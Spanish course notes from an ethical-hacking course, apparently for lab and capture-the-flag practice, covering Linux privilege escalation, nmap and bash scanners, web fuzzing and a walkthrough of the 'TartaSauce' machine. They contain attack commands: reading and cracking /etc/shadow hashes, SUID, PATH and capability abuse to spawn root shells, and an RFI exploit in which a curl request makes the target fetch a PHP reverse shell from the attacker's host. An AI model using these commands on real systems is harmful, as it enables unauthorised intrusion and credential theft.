# Apuntes-CursoHackingEtico-S4vitar
Apuntes sobre el curso de introdución al hacking ético de s4vitar
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
Aclarar que las explotaciones que se muestran, en la gran mayoria, ya no son funcionales de la manera que él las explica (ya que són errores de seguridad para ganar acceso a root que ya han sido solucionados, en la versión actual de linux).
Por lo tanto, estos metodos se deben de tomar como simple práctica y conocimiento básico.


EXLOTACIÓN Y ABUSO DE LOS PRIVILEGIOS 
    
-find \-perm -4000 (2>/dev/null) -> Para buscar quien tiene privilegios SUID (los directorios a los que no pueda acceder se redirijen hacia /dev/null).
-cat /etc/shadow | grep "ENCRYPT_METHOD" -> Para mostrar el metodo de encritado de las passwords de los usuarios -> Con una wordlist como rockyou.
-cat /etc/shadow | grep raul > hash -> Cojes la contraseña encriptada del usuario raul.
-john --wordlist=rockyou.txt hash -> Para romper la contraseña hash podemos utilizar john con el wordlist rockyou.
-find \-writable (2>/dev/null) | grep "etc" -> Filtramos por los archivos que se puedan escribir como "otros" y ademas ponemos un filtro para el directorio /etc
que es critica.
Si podemos escribir en /etc/passwd y cambiamos la X (contraseña hasheada) y ponemos nostros un hash que hemos creado con anterioridad con openssl pssword 
(tiene que ser del tipo DES(Unix) se puede comprobar con hash-identifier o hashid), después cuando hagamos sudo su y nos pida la contraseña de root podremos
ganar acceso poniendo poniendo la contraseña sin hashear que hemos sustituido en /etc/passwd. (NO COMPROVADO)

DETECCIÓN DE TAREAS CRON A TRAVES DE UN SCRIPT EN BASH

-ps -eo command -> lista los comandos que se estan ejecutando en tiempo real -> con esto creamos un script para que nos muestre por pantalla los comandos que se van 
ejecutando en cada momento (diff entre los viejos y los nuevos), y aplicamos un filtro para ver solo lo que nos interesa (en este caso las tareas cron que se estan
ejecutando). Seguidamente miraremos si algunas de estas tareas es writable por otros, y si lo es, modificaremos el archivo para que ejecute:
-chmod 4755 /bin/bash -> de esta manera cuando el sistema ejecute el archivo cron dará privilegios SUID a la bash, de forma que "otros" podran ganar acceso a la shell
con el comando:
-bash -p -> donde -p es una flag de seguridad necesaria para hacer uso de los privilegios SUID. (NO FUNCIONAL)


EXLOTACIÓN DE UN PATH HIJACKING FRENTE A UN BINARIO SUID

Primeramente, programaremos un pequeño programa en c que lo unico que hace es ejecutar un par de llamadas a sistema. En c como medida de segurida nos obliga a
declarar setuid(0) para que lo podamos ejecutar con los privilegios SUID cuando usamos un usuario no propietario (otros).
-echo $PATH -> Nos mostrara las diferentes rutas por la que busca los comandos que ejecutamos. Por eso cuando hacemos la llamada a sistema whoami nos devuelve
lo mismo que si lo hacemos por la ruta aboluta /usr/bin/whoami. Por tanto, que pasará si creamos un archivo llamado whoami en una ruta más prioritaria que
/usr/bin? Al no ejecutarlo con la ruta absoluta el sistema encontraría antes el whoami que hemos creado.
-export PATH=.:$PATH -> Este comando se utiliza para modificar la prioridad de las rutas, en este caso se esta poniendo la ruta actual como la más prioritaria
(.) aunque podemos poner cualquier ruta. Estos cambios son temporales por cada sesión.
-strings backup (binario) -> Con strings se nos permite mostrar las cadenas de caracteres de un binario para de esta forma poder averiguar que comandos se estan 
ejecutando y si se esta haciendo desde una ruta absoluta o no.
Esto mismo se puede utilizar para lanzar una shell como root. Ya que el ejecutable del programa c tiene privilegios SUID, modificaremos $PATH para que la ruta más 
prioritaria sea /tmp donde tendremos un script que lanza una shell (bash -p). Por lo tanto, cuando se ejecute el programa en c y se haga la llamada a sistema ps 
utilizando la ruta relativa realmente se estará ejecutando nuestro script de la shell y ganaremos acceso a root. (NO FUNCIONAL)


EXPLOTACIÓN Y ABUSO DE LAS CAPABILITIES EN LINUX

Hay veces que es un tanto desafiante convertirse en root y no merece la pena. Existe otra alternativa, lo que se conoce como persistencias. Otra cosa que podriamos
hacer para pasar más desapercibidos es mediante la explotación y el abuso de las capabilities.
-getcap -r / 2>/dev/null -> Para mostrar las capabilities que hayan definidas a nivel de sistema en la raiz de forma recursiva, 2>/dev/null lo utilizamos para un
mejor filtraje al eliminar el stder (ya que habrá rutas a las que no tenga acceso al no ser root).
-setcap cap_setuid+ep /usr/bin/python3.8 -> Le asignamos a python3.8 la capability del setuid+ep (utilizada más adelante para poder poner el setuid(0)).
-setcap -r cap_setuid+ep /usr/bin/python3.8 -> Con -r le quitamos la capability
-python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")' -> -c quiere decir desde una consola interactiva en un 'one liner', se importa la libreria os y
atraves de un atributo de os que es setuid(0) le indiacamos que queremos operar con el id=0 (root) y seguidamente, atraves de otro atributo de os, indicamos que 
queremos hacer una llamada al sistema y abrir una bash.
Hay muchos tipos de capabilities que nos permiten explotar diferentes servicios para ganar acceso a root. En iternet se pueden buscar. Ej GTFOBins. (NO FUNCIONAL)

---

## PENTESTING: 5 fases

**Fases:**
1. Reconocimiento inicial
2. Búsqueda de versiones y exploits
3. Explotación
4. Obtención de resultados
5. Documento ejecutivo y técnico (Auditorías)

---

### FASE DE RECONOCIMIENTO INICIAL - ENUMERACIÓN DE PUERTOS CON NMAP

```bash
ping -c 1 10.0.2.2
```
Envía una trama ICMP a la dirección IP especificada (en este caso, el gateway del router). Si el TTL está cerca de 64, es una máquina Linux; si está cerca de 128, es una máquina Windows.

```bash
nmap 10.0.2.2 -p- --open -T5 -v -n -oG allPorts
```
La herramienta `nmap` permite escanear los puertos de una máquina objetivo. Los argumentos utilizados son:
- `-p-`: Escanea los 65535 puertos.
- `--open`: Muestra solo los puertos abiertos.
- `-T5`: Define el nivel de agresividad (cuanto más alto, más rápido y agresivo).
- `-v`: Modo verbose para mostrar los resultados en tiempo real.
- `-n`: No realiza resolución DNS.
- `-oG allPorts`: Exporta el resultado en formato grepable a un archivo llamado `allPorts`.

---

### CREANDO UNA PEQUEÑA UTILIDAD EN BASH PARA EL FILTRADO DE PUERTOS

La utilidad mostrará la información más relevante del archivo `allPorts`, que contiene los puertos abiertos de una cierta dirección IP. Filtraremos utilizando expresiones regulares:

```bash
cat allPorts | grep -oP '\d{1,5}/open' | awk '{print $1}' FS= "/" | xargs | tr ' ' ','
```
Para filtrar el output del archivo `allPorts`:
- `grep -oP '\d{1,5}/open'`: Imprime solo los números de 1 a 5 dígitos acompañados de `/open`.
- `awk '{print $1}' FS= "/"`: Muestra el primer argumento, delimitado por `/`.
- `xargs | tr ' ' ','`: Compacta todo en una sola línea y reemplaza espacios por comas.
- **Resultado:** `22,80,443,445`

```bash
cat allPorts | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u
```
Para listar las direcciones IP del archivo `allPorts` (IP de la víctima):
- `grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'`: Extrae las direcciones IP.
- `sort -u`: Elimina direcciones IP duplicadas.

Para utilizar la utilidad, modifica el archivo `.zshrc` (o `.bashrc` si usas bash), creando una función que aplique los filtrajes mencionados al archivo `allPorts`:

```bash
function extractPorts(){
    echo -e "\n${purpleColour}[*] Extracting information...${endColour}\n"
    ip_address=$(cat allPorts | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)
    open_ports=$(cat allPorts | grep -oP '\d{1,5}/open' | awk '{print $1}' FS="/" | xargs | tr ' ' ',')

    echo -e "${redColour}[*] IP Address: ${endColour}${grayColour}$ip_address${endColour}"
    echo -e "${redColour}[*] Open Ports: ${endColour}${grayColour}$open_ports${endColour}\n"

    echo $open_ports | tr -d '\n' | xclip -sel clip
    echo -e "${purpleColour}[*] Ports copied to clipboard!${endColour}\n"
}
```

Para el correcto funcionamiento de los colores, añade las siguientes líneas al archivo:

```bash
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"
```

De esta forma, utilizando el comando `extractPorts allPorts` se mostrará tanto la IP víctima como los puertos abiertos. Además, los puertos abiertos se copiarán al portapapeles.

---

## DETECCIÓN DE VERSIÓN Y SERVICIOS CON NMAP

Vamos a lanzar una serie de scripts básicos de enumeración con `nmap`, para tratar de descubrir la versión y el servicio que corren los puertos abiertos.

```bash
nmap -sC -sV -p22,80 10.0.2.2 -oN targeted
```
- `-sC`: Detectar el servicio (script) que está corriendo.
- `-sV`: Detectar la versión.
- `-p22,80`: Puertos específicos a escanear.
- `10.0.2.2`: Dirección IP objetivo.
- `-oN targeted`: Exportar en formato nmap a un fichero llamado `targeted`.

Si encontramos el puerto 80 abierto (utilizado para las páginas web), podemos utilizar `whatweb` para ver la información más relevante.

```bash
whatweb http://10.10.10.188 2>/dev/null
```
Utilizamos `2>/dev/null` para la gestión de errores.

---

## TÉCNICAS PARA AGILIZAR NUESTROS ESCANEOS CON NMAP

En algunas ocasiones, con la configuración anterior, el escaneo de `nmap` puede llevar bastante tiempo en completarse. Vamos a proponer otra configuración para tratar de solventar este problema. Una posible solución sería:

```bash
nmap --top-ports 5000 --open -T5 -v -n 10.10.10.11
```
- Escanea solo los 5000 puertos más relevantes, lo que puede ser una buena solución aunque es posible que se deje algún puerto abierto sin escanear.

Otra solución sería (TCP-SYN scan):

```bash
nmap -sS --min-rate 5000 --open -vvv -n -Pn -p- 10.10.10.11
```
- `-sS`: Tipo de escaneo TCP-SYN.
- `--min-rate 5000`: Emitir paquetes a una tasa no menor de 5000 paquetes/s.
- `-Pn`: No aplicar host discovery (protocolo ARP).

---

## CREACIÓN DE HERRAMIENTA EN BASH PARA LA DETECCIÓN DE PUERTOS TCP ABIERTOS

Para detectar puertos abiertos de una forma más discreta que con `nmap`, podríamos crear un script en bash llamado `portScan` que sea capaz de detectar los puertos abiertos mediante el protocolo TCP de forma manual.

Para ello, nos aprovechamos de un concepto que nos permitirá saber si un puerto de una cierta dirección IP está abierto o no.

```bash
bash -c "echo ' ' > /dev/tcp/10.0.2.2/port"
```
Lo que estamos haciendo es mandar un espacio vacío mediante TCP a la IP y puerto indicado. Si lo enviamos a un puerto que está abierto, no hace nada; en cambio, cuando lo enviamos a un puerto cerrado, nos aparece un mensaje de error. Para comprobarlo:

```bash
echo $?
```
Si nos muestra un 0, el comando anterior ha tenido éxito (el puerto está abierto), y si nos muestra un 1, no ha tenido éxito (el puerto está cerrado).

Aprovechando esto, podemos crear el siguiente script en bash para detectar puertos abiertos mediante TCP:

```bash
#!/bin/bash

# ./portScan.sh <ip-address>

# Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"

if [ $1 ]; then
    ip_address=$1
    for port in $(seq 1 65535); do
        timeout 1 bash -c "echo ' ' > /dev/tcp/$ip_address/$port" && echo -e "[*] Port ${redColour}$port${endColour} - ${greenColour}OPEN${endColour}" &
    done; wait
else
    echo -e "\n[*] Use: .portScan.sh <ip_address>\n"
    exit 1
fi
```

Combinamos el comando visto anteriormente con `&&` para que nos imprima el puerto abierto. El `&` final marca que utilice varios hilos, de forma que todas las peticiones salgan a la vez y no se tengan que esperar entre ellas.

---

## CREACIÓN DE HERRAMIENTA EN BASH PARA EL DESCUBRIMIENTO DE EQUIPOS EN LA RED

Como en el ejemplo anterior, podemos utilizar `nmap` para el reconocimiento de máquinas en un segmento de red, pero es muy ruidoso. Por lo tanto, merece la pena que tengamos nuestro propio script. De forma similar al ejemplo anterior, nos aprovecharemos de un concepto en concreto. En este caso, si enviamos un ping a una dirección IP, esta nos contesta y el comando `echo $?` nos mostrará un 0. De forma contraria, si no nos contesta, nos devolverá un 1. Podemos crear el siguiente script:

```bash
#!/bin/bash

# Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
purpleColour="\e[0;35m\033[1m"
redColour="\e[0;31m\033[1m"

for i in $(seq 2 254); do
    timeout 1 bash -c "ping -c 1 10.0.2.$i > /dev/null 2>&1" && echo -e "${redColour}[*]${endColour} ${purpleColour}Host 10.0.2.$i${endColour} - ${greenColour}ACTIVE${endColour}" &
done; wait
```

- `> /dev/null 2>&1`: Se utiliza para que no se muestre el output del comando, de forma que solo veamos el mensaje.
- El ejemplo está hecho con la dirección `10.0.2/24`, pero podemos modificarla según necesitemos e incluso poner un doble bucle para buscar en una red `/16`, por ejemplo.

---

## RECONOCIMIENTO A TRAVÉS DE LOS SCRIPTS QUE INCORPORA NMAP POR CATEGORÍA

Anteriormente hemos hablado de utilizar scripts básicos de enumeración con el parámetro `-sC`, pero ¿dónde se encuentran esos scripts y qué categoría tienen? Lo podemos hacer con los siguientes comandos:

```bash
updatedb
```
Para sincronizar todos los archivos existentes a nivel de sistema en una base de datos.

```bash
locate .nse | xargs grep "categories" | grep -oP '".*?"' | sort -u
```
- Una vez actualizado, con `locate` muestra la ruta absoluta de un archivo. En este caso, nos interesan los archivos con extensión `.nse` que son los scripts de `nmap`.
- Paralelamente, con `xargs` ejecutamos `grep` para cada script y extraemos su categoría.
- `grep -oP '".*?"'`: Filtra por expresiones regulares para mostrar toda la información entre comillas (el nombre de la categoría).
- `sort -u`: Ordena de forma única.

Hay un total de 14 categorías y sabiendo sus nombres podemos utilizarlos para lanzar una serie de scripts de una categoría en concreto. Por ejemplo:

```bash
nmap -p445 10.10.10.40 --script "vuln and safe" -oN smbScan
```
Para el puerto 445 (samba) estamos lanzando una serie de scripts de la categoría `vuln` y `safe` y exportando a un archivo llamado `smbScan` en formato nmap. Como vemos, las categorías se pueden fusionar con un `and` o un `or`.

---

## USO DE SCRIPTS ESPECÍFICOS DE NMAP Y USO DE ANALIZADORES DE TRÁFICO

`Nmap`, aparte de la enumeración de servicios, también te permite, entre otras cosas, listar directorios que puedan existir en el servidor web (incluidos archivos). ¿Cómo hacemos esto? Mediante scripts:

```bash
nmap -p80 10.10.10.188 --script http-enum -oN webScan
```
- Utilizamos el script `http-enum` (fuzzing). Básicamente, este script envía peticiones al servidor web de directorios o archivos que puedan existir (método GET) utilizando un diccionario interno de `nmap`. Gracias al código que nos retorne el servidor a esta petición (`403 ERROR` o `200 OK`), sabremos si el directorio o archivo existe en el servidor web.

Una forma de saber qué está pasando por detrás cuando ejecutamos este script es utilizando `tcpdump`:

```bash
tcpdump -i tun0 -w Captura.cap -v
```
Escucha el tráfico que pasa por la interfaz indicada y exporta el output en el fichero `Captura.cap`.

Para interpretar esta captura, podemos utilizar `tshark` (wireshark sin interfaz gráfica) y aplicar filtros para averiguar qué diccionario interno está utilizando `nmap`:

```bash
tshark -r Captura.cap -Y "http" -Tfields -e tcp.payload 2>/dev/null | xxd -ps -r | grep "GET" | awk '{print $2}' | sort -u
```
- Se aplican varios filtros, primero por peticiones web `http`.
- Con `-Tfields -e` aplicamos otro filtro del campo que nos interese (podemos saber los diferentes campos haciendo una pequeña búsqueda antes con el parámetro `-Tjson`).
- Como este campo está codificado en hexadecimal, utilizamos `xxd` con los parámetros `-ps -r` para hacer el 'reverse' de la codificación y que de esta forma sea legible.
- Una vez decodificado, aplicamos otro filtro para que solo nos interesen las peticiones `GET` y utilizamos `awk` para que nos muestre solamente el segundo parámetro.
- `sort -u`: Ordena de forma única.

---

## USO DE WIRESHARK PARA EL ANÁLISIS DE TRÁFICO EN LA RED

`Wireshark` es similar a `tshark` pero con interfaz gráfica, lo que lo hace un poco más fácil de manejar a pesar de sus limitaciones. Para poder abrir `wireshark` desde la terminal como un programa independiente, ejecutamos los siguientes comandos:

```bash
wireshark Captura.cap > /dev/null 2>&1 &
disown
```
- Redirige el stderr output a `dev/null`.
- Con `&` lo hacemos un proceso aislado a la terminal.
- Finalmente, para que el proceso no muera al cerrar la terminal (ya que `wireshark` es el proceso hijo), ejecutamos `disown`.

---

## CREACIÓN DE SCRIPT EN PYTHON3 PARA IDENTIFICAR EL SISTEMA OPERATIVO

Crearemos una utilidad en `python3` que, al proporcionar la dirección IP como parámetro, nos muestre el sistema operativo de la víctima. Esto se puede hacer mediante el campo `TTL` (64 en Linux y 128 en Windows) cuando lanzamos un ping. Es recomendable tener conocimientos básicos de Python para realizar este tipo de scripts.

```python
#!/usr/bin/python3
import re, sys, subprocess

# usage: $ python3 whichSystem.py <ip>

if len(sys.argv) != 2:
    print("\n[!] Usage: python3 " + sys.argv[0] + " <direccion-ip>\n")
    sys.exit(1)

def is_valid_ip(ip_address):
    # Utilizamos una expresión regular para verificar el formato de la dirección IP
    ip_pattern = r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$"
    return re.match(ip_pattern, ip_address) is not None

def get_ttl(ip_address):
    if not is_valid_ip(ip_address):
        print("\n[!] Dirección IP no válida. Por favor, introduzca una dirección IP válida.\n")
        sys.exit(1)

    proc = subprocess.Popen(["/usr/bin/ping -c 1 %s" % ip_address, ""], stdout=subprocess.PIPE, shell=True)
    (out, err) = proc.communicate()
    out = out.split()
    out = out[12].decode('utf-8')
    ttl_value = re.findall(r"\d{1,3}", out)[0]

    return ttl_value

def get_os(ttl):
    ttl = int(ttl)
    if ttl >= 0 and ttl <= 64:
        return "Linux"
    elif ttl >= 65 and ttl <= 128:
        return "Windows"
    elif ttl >= 129 and ttl <= 254:
        return "Solaris/AIX"
    else:
        return "Not Found"

if __name__ == '__main__':
    ip_address = sys.argv[1]
    ttl = get_ttl(ip_address)
    os_name = get_os(ttl)
    print("\n[*] %s (ttl -> %s): %s\n" % (ip_address, ttl, os_name))
```

A grandes rasgos, vemos cómo lanzamos un ping a la dirección IP pasada por parámetro y después aplicamos una serie de filtros para quedarnos solamente con el valor del `TTL`. Con este valor podemos determinar qué SO tiene la máquina víctima.

Una vez que tenemos nuestro script, le damos permisos de ejecución y lo podemos poner en alguna ruta del `PATH` para poder mencionarlo desde una ruta relativa. Por ejemplo, lo podemos mover a `/usr/bin`.

---

## USO DE WFUZZ PARA HACER FUZZING

### Fuzzing
El fuzzing es la técnica utilizada para encontrar rutas dentro de un servidor web. Anteriormente, ya hemos utilizado un script de nmap para hacer fuzzing (`http-enum`), pero no es una herramienta especializada en el fuzzing. Si queremos profundizar un poco más, tendremos que utilizar otras herramientas, como `Wfuzz`.

```bash
wfuzz -c -L -t 400 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt https://@IP/FUZZ
```

- **Parámetros**:
  - `-c`: Muestra el output en formato colorizado.
  - `-L`: Sigue los redireccionamientos (`follow-redirect`), ahorrándonos los códigos 301 y mostrando el estado final de la petición (código 200).
  - `-t`: Especifica los threads (cuántas peticiones se hacen simultáneamente).
  - `--hc=404`: En el output no se muestran las peticiones con el código de error 404 (`hc` = `hide code`).
  - `-w`: Especifica el diccionario a utilizar, el cual contiene muchos nombres de directorios que se probarán por fuerza bruta.
  - El fuzzing se hace contra la dirección IP indicada y con `/FUZZ` indicamos dónde queremos que se sustituyan las palabras del diccionario.

Podemos usar varios filtros al mismo tiempo, por ejemplo `--sc=200 --hl=170` (`sc` = `show code`). Hay muchos más filtros (por líneas, palabras, caracteres...) que se pueden consultar con el manual.

### Fuzzing de Extensiones de Archivo con WFUZZ (Uso de Múltiples Payloads)
Para comprobar qué tipo de archivos tiene la víctima, usamos otro diccionario:

```bash
wfuzz -c -L -t 400 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -w extensiones.txt https://@IP/FUZZ.FU2ZZ
```

- **Extensiones.txt**: Un archivo creado por nosotros que contiene las extensiones que queremos comprobar.
- Con `/FUZZ.FU2ZZ`, para cada palabra del primer diccionario buscamos si tiene algunas de las extensiones del segundo diccionario.
- `Wfuzz` cuenta con su propio User-Agent, que se puede modificar con el parámetro `-H "User-Agent: Google Chrome"`. Incluso se pueden utilizar cookies de sesión para aplicar fuzzing a recursos internos de un panel, ya estando autenticados.

---

## USO DE DIRBUSTER PARA HACER FUZZING

`Dirbuster` tiene el mismo propósito que `Wfuzz` pero, igual que `Wireshark`, tiene una interfaz gráfica. Para abrir `Dirbuster` lo haremos del mismo modo que hacíamos con `Wireshark`:

```bash
dirbuster > /dev/null 2>&1 &
disown
```

A modo de recordatorio, redirigimos el stderr output al `dev/null` y con `&` lo hacemos un proceso aislado a la terminal. Finalmente, para que el proceso no muera al cerrar la terminal (ya que `dirbuster` es el proceso hijo) ejecutamos `disown`.

Si haciendo fuzzing encontramos, por ejemplo, un directorio con varios archivos, podemos hacer lo siguiente:

```bash
wget -r http://IP/<nombre-directorio>
```

Para descargar todos los archivos que haya en el directorio de forma recursiva. Una vez descargados todos los archivos, podemos hacer búsquedas recursivas por palabras clave para encontrar información relevante. Ejemplo:

```bash
grep -r -E -i "pass|user|key|database" | less -S
```

- **Parámetros**:
  - `-r`: De forma recursiva.
  - `-E`: Para diversos campos.
  - `-i`: Sin atender a mayúsculas o minúsculas.
  - `less -S`: Para que no haya saltos de línea y sea más legible el output.

---

## USO DE DIRB PARA HACER FUZZING

`Dirb` es una herramienta para hacer fuzzing un poco más sencilla que las anteriores. No tiene hilos de ejecución, por lo que puede ir un poco lenta. Si no especificamos un diccionario, utilizará uno interno (el cual se muestra cuando se ejecuta la herramienta), pero este es muy pequeño, por lo que se recomienda utilizar el de `dirbuster`, por ejemplo:

```bash
dirb https://IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

---

## USO DE GOBUSTER PARA HACER FUZZING

`Gobuster` es una herramienta hecha en el lenguaje de programación 'Go' y trabaja muy bien con sockets y conexiones, por lo que es bastante potente. Con el comando `gobuster` se puede ver un poco de información de los parámetros que admite la herramienta, ya que en este caso no tenemos manual.

```bash
gobuster dir -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url https://IP
```

- **Parámetros**:
  - `dir`: Modo de fuerza bruta por directorio o archivo.
  - `-t`: Indica los hilos de ejecución.
  - `-w`: Indica el diccionario.
  - `--url`: Indica la dirección IP.

Un punto positivo de esta herramienta es que muestra la barra de progreso, lo que nos da un tiempo estimado de ejecución.

---

## USO DE DIRSEARCH PARA HACER FUZZING

`Dirsearch` no es una herramienta predeterminada, por lo que hay que descargarla desde GitHub. Esta herramienta permite jugar con muchos parámetros, lo que la hace muy útil y cómoda.

```bash
./dirsearch.py -u https://IP -E -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

- **Parámetros**:
  - `-u`: Indica la URL.
  - `-w`: Indica el diccionario.
  - `-E`: Utiliza un diccionario de extensiones por defecto.

Como vimos en `Wfuzz`, esta herramienta también permite jugar con las cookies para aplicar fuzzing a recursos internos estando ya autenticados, cambiar los headers o aplicar filtros. Es una herramienta que ofrece mucha versatilidad. `Wfuzz` y `dirsearch` son las herramientas más completas para hacer fuzzing.

---

## TÉCNICAS DE ENUMERACIÓN BAJO UN SERVIDOR WEB

Según el gestor de contenido (WordPress, Drupal...), lo más probable es que tengamos que utilizar herramientas específicas que escanean este gestor de contenido en concreto.

Un ejemplo, en una página web con un gestor de contenido WordPress, hacemos `Ctrl+U` para ver el código fuente. Si vemos que las imágenes hacen alusión a una misma dirección que es la que tiene el contenido, podemos pensar en un concepto llamado `Virtual Host Routing`, que permite contar con múltiples servidores virtuales web desde una misma máquina, en función del dominio especificado nos carga una web distinta.

Ante esta situación, podemos modificar el archivo `/etc/hosts`:

```plaintext
127.0.0.1   localhost
127.0.1.1   parrot

IP         <dominio>
```

De esta forma, cualquier consulta que se realice al dominio indicado se resuelve a la IP indicada. Si podemos acceder a la dirección que tiene el contenido de las imágenes, es que se estaba haciendo uso del `Virtual Host Routing` y lo hemos explotado.

Ahora nos gustaría saber si el servidor web contiene un `WAF` (Web Application Firewall). Este es un tipo de firewall que filtra o bloquea el tráfico HTTP hacia y desde la aplicación web. Podemos utilizar herramientas como `Wafw00f <ip>` para saber si la web tiene un `WAF`.

Para cada gestor de contenido existen diferentes herramientas para efectuar un reconocimiento. Es nuestro trabajo buscar esas herramientas y documentarnos para aprender a utilizarlas. En este caso, estamos frente a un WordPress, por lo que podríamos utilizar `Wpscan`:

```bash
wpscan --url "http://IP" -e vp,u
```

- **Parámetros**:
  - `--url`: Indica el dominio de la página, ya sea mediante la IP o el nombre.
  - `-e vp,u`: Enumera plugins vulnerables (`vulnerable plugins`) y usuarios existentes en el gestor de contenido.

La herramienta realiza un reconocimiento sobre el gestor de contenido y trata de informar por consola si hay vulnerabilidades potenciales. Aunque el gestor de contenido esté actualizado a su última versión, si utiliza un plugin desactualizado puede ser vulnerable. Hay muchas herramientas de reconocimiento que podemos encontrar vía internet que también hacen muy buen trabajo. Algunas son más generales, como `nikto`, `openVAS` o `nessus`, y otras más especializadas en un gestor de contenido, como ya hemos visto. 

Por ejemplo, `WPSeku` es otra herramienta de escaneo para WordPress, disponible vía GitHub y su funcionamiento sería el siguiente:

```bash
python3 wpseku.py -u http://<dominio>
```

Escaneo básico, solamente especificamos la URL.

---

# Hackeando Nuestra Primera Máquina (RFI)

Hasta este punto ya hemos visto la metodologia para enumerar puertos, servicios que corren bajo estos puertos, versiones... Con esto, detallaremos cómo un atacante puede hackear una máquina Linux con un servidor web y varios gestores de contenido. Supondremos que la IP víctima es `10.10.10.88`.

## Preparativos

1. **Verificar Conectividad**:
    ```bash
    ping -c 1 10.10.10.88
    ```
    Verificamos si la máquina está activa y responde. Puede que el ping esté desactivado, en cuyo caso, utilizaremos TCP o UDP.

2. **Identificar Sistema Operativo**:
    ```bash
    whichSystem 10.10.10.88
    ```
    Ejecutamos un script que nos indica el sistema operativo de la víctima. En este caso, es Linux.

3. **Crear Directorios de Trabajo**:
    ```bash
    mkdir TartaSauce
    cd TartaSauce
    mkt
    ```
    Creamos un directorio con el nombre de la máquina víctima y subdirectorios (`Content`, `exploits`, `nmap`, `scripts`, `tmp`) usando una función personalizada.

## Fase de Reconocimiento

1. **Escaneo de Puertos**:
    ```bash
    nmap -p- --open -T5 -v -n 10.10.10.88 -oG allPorts
    extratPorts allPorts
    ```
    Realizamos un escaneo de todos los puertos abiertos y los exportamos en formato grepable al fichero `allPorts`. Extraemos los puertos abiertos y los copiamos al portapapeles. En este caso, solo el puerto 80 está abierto.

2. **Identificación de Servicios**:
    ```bash
    whatweb https://10.10.10.88 2>/dev/null
    nmap -sC -sV -p80 10.10.10.88 -oN targeted
    ```
    Con `whatweb`, obtenemos información relevante del servidor web. Luego, lanzamos scripts básicos de enumeración con `nmap` para averiguar la versión del servidor web y exportamos los resultados al fichero `targeted`.

3. **Escaneo HTTP**:
    ```bash
    nmap --script http-enum -p80 10.10.10.88 -oN webScan
    ```
    Antes de aplicar fuzzing con herramientas especializadas, lanzamos el script `http-enum` y exportamos los resultados al fichero `webScan`.

4. **Fuzzing para Encontrar Directorios**:
    ```bash
    wfuzz -c -L -t 400 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt https://10.10.10.88/webservices/FUZZ
    ```
    Utilizamos Wfuzz para hacer un ataque de fuerza bruta con diccionarios, apuntando al directorio `webservices` encontrado en `robots.txt`.

## Acceso a WordPress

1. **Escaneo de WordPress**:
    ```bash
    wpscan --url "https://10.10.10.88/webservices/wp/" -e vp,u
    ```
    Realizamos un escaneo general del gestor de contenido para enumerar plugins vulnerables y usuarios. Si no obtenemos información relevante, continuamos manualmente.

2. **Fuzzing para Plugins**:
    ```bash
    wfuzz -c -L -t 400 --hc=404 -w wp-plugins.fuzz.txt https://10.10.10.88/webservices/wp/FUZZ
    ```
    Utilizamos un diccionario de plugins de WordPress (`wp-plugins.fuzz.txt`) para identificar plugins instalados.

## Fase de Explotación de Vulnerabilidades

1. **Buscar Exploit**:
    ```bash
    searchsploit gwolle
    searchsploit -x php/webapps/38861.txt
    ```
    Usamos Searchsploit para buscar un exploit del plugin identificado. En este caso, encontramos un exploit de tipo Remote File Inclusion (RFI).

2. **Preparar y Ejecutar el Exploit**:
    - **Preparar Shell Reversa**:
        ```bash
        mv php-reverse-shell.php wp-load.php
        ```
    - **Compartir el Archivo PHP**:
        ```bash
        python -m SimpleHTTPServer 80
        ```
    - **Poner en Escucha**:
        ```bash
        nc -nlvp 443
        ```
    - **Lanzar Exploit**:
        ```bash
        curl "https://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.18"
        ```
        Desde un servidor web alojando `wp-load.php`, lanzamos el exploit para obtener una reverse shell.

## Tratamiento de la TTY

1. **Obtener Pseudo-Consola**:
    ```bash
    script /dev/null -c bash
    ```
    Lanzamos una pseudo-consola.

2. **Configurar Terminal**:
    - **Dejar en Segundo Plano**:
        ```bash
        Ctrl+Z
        ```
    - **Configurar Terminal**:
        ```bash
        stty raw -echo
        fg
        reset
        ```
        Introducimos `reset` y seleccionamos `xterm` como tipo de terminal.

    - **Establecer Variables de Entorno**:
        ```bash
        export TERM=xterm
        export SHELL=bash
        ```

3. **Ajustar Proporciones de la Terminal**:
    ```bash
    stty -a
    stty rows 52 columns 187
    ```
    Ajustamos las proporciones de la terminal para tener una shell interactiva y cómoda.

---

Este proceso nos permite hackear la máquina víctima, ganar acceso no privilegiado y configurar la terminal para trabajar de forma eficiente.
